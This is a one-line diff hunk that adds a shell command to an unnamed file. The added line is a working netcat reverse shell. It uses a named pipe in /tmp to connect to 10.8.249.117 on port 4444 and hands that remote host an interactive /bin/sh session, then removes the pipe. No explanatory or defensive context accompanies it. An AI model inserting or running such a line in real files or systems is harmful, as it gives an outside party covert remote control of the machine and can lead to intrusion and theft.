@@ -1,0 +1,1 @@
+mkfifo /tmp/dopc; nc 10.8.249.117 4444 0</tmp/dopc | /bin/sh >/tmp/dopc 2>&1; rm /tmp/dopc
